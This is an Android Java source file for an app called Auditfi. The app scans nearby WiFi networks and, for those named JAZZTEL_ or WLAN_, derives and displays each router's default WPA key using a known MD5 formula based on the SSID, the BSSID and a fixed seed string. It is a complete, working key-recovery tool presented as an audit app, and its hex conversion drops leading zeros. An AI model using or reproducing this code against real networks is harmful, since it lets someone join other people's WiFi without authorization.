 package com.auditfi;
 
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 import java.util.List;
 
 import android.app.Activity;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.IntentFilter;
 import android.net.wifi.ScanResult;
 import android.net.wifi.WifiConfiguration;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.Bundle;
 import android.util.Log;
 import android.view.View;
 import android.view.Window;
 import android.view.View.OnClickListener;
 import android.widget.Button;
 import android.widget.TextView;
 import android.widget.Toast;
 
 public class AuditfiActivity extends Activity implements OnClickListener {
 	private static final String TAG = "Auditfi";
 	WifiManager wifi;
 	BroadcastReceiver receiver;
 
 	TextView textStatus;
 	Button buttonScan;
 
 	/** Called when the activity is first created. */
 	@Override
 	public void onCreate(Bundle savedInstanceState) {
 
     	/* Codigo para no poner el titulo */
         requestWindowFeature(Window.FEATURE_NO_TITLE);
         
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.main);
 
 		// Setup UI
 		textStatus = (TextView) findViewById(R.id.textStatus);
 		buttonScan = (Button) findViewById(R.id.buttonScan);
 		buttonScan.setOnClickListener(this);
 
 		// Setup WiFi
 		wifi = (WifiManager) getSystemService(Context.WIFI_SERVICE);
 
 		//Si no esta activado wifi lo activamos
 		if(!wifi.isWifiEnabled()){
 			//No esta activado el wifi!
             Toast.makeText( this, getResources().getString( R.string.ActivandoWifi ), Toast.LENGTH_LONG ).show();
             
             //Activamos el wifi
             wifi.setWifiEnabled(true);
 		}
 		Log.d(TAG, "onCreate()");
 	}
 
 
 	public void onClick(View view) {
 
 		if (view.getId() == R.id.buttonScan) {
 			
 			
 			if(!wifi.isWifiEnabled()){
 				//No esta activado el wifi!
 	            Toast.makeText( this, getResources().getString( R.string.WifiOff ), Toast.LENGTH_LONG ).show();
 	            
 	            //Salimos
 	            return ;
 			}
 			
 			Log.d(TAG, "onClick() wifi.startScan()");
 			wifi.startScan();
 
 			// Listado de las redes wifi
 			List<ScanResult> configs = wifi.getScanResults();
 			textStatus.setText(""); //Limpiamos el texto
 			
 			for (ScanResult config : configs) {
 				String nombre = "";
 				if (config.SSID.length()==12)
 					nombre=config.SSID.substring(0, 8);
 				else if (config.SSID.length()==9)
				    nombre=config.SSID.substring(0, 5);
 				
 				
 				textStatus.append("\n\n" + "Red: " + config.SSID + " - " + config.BSSID + " (" + config.level + "db) ");
 				if (nombre.equals("JAZZTEL_") || nombre.equals("WLAN_")) {
 					// Calculamos la clave
 					textStatus.append("\n" + "Key: "+ getKey(config.SSID, config.BSSID));
 					// textStatus.append("\n\n" + config.toString());
 				}
 			}
 			Log.d(TAG, "onClick() Refresh()");
 
 		}
 
 	}
 
 	/*
 	 * Calcula la clave por defecto y la devuelve
 	 */
 	public String getKey(String SSID, String BSSID) {
 		String key;
 
 		// $bssid = preg_replace('/:/', '', strtoupper(trim($_POST['bssid'])));
 		BSSID = BSSID.toUpperCase();
 		BSSID = BSSID.replace(":", "");
 
 		if (BSSID.length() != 12) {
 			key = "MAC del router erronea";
 		} else {
 			SSID = SSID.toUpperCase();
 			SSID = SSID.trim();
 
 			// bcgbghgg + 4 primeros grupos de la mac + los ultimos 4 caracteres
 			// de la ESSID + la mac
 			key = md5("bcgbghgg" + BSSID.substring(0, 8)
 					+ SSID.substring(SSID.length() - 4) + BSSID);
 
 			// O bien bcgbghgg + 5 primeros grupos de la mac + 2 ultimos
 			// caracteres de la mac -3 + la mac
 
 			key=key.substring(0, 20);
 
 		}
 
 		return key;
 	}
 
 	
 	/*
 	 * Calcula el md5 de una cadena de texto
 	 */
 	
 	public String md5(String s) {
 		try {
 			// Create MD5 Hash
 			MessageDigest digest = java.security.MessageDigest
 					.getInstance("MD5");
 			digest.update(s.getBytes());
 			byte messageDigest[] = digest.digest();
 
 			// Create Hex String
 			StringBuffer hexString = new StringBuffer();
 			for (int i = 0; i < messageDigest.length; i++)
 				hexString.append(Integer.toHexString(0xFF & messageDigest[i]));
 			return hexString.toString();
 
 		} catch (NoSuchAlgorithmException e) {
 			e.printStackTrace();
 		}
 		return "";
 	}
 	
 	
 }
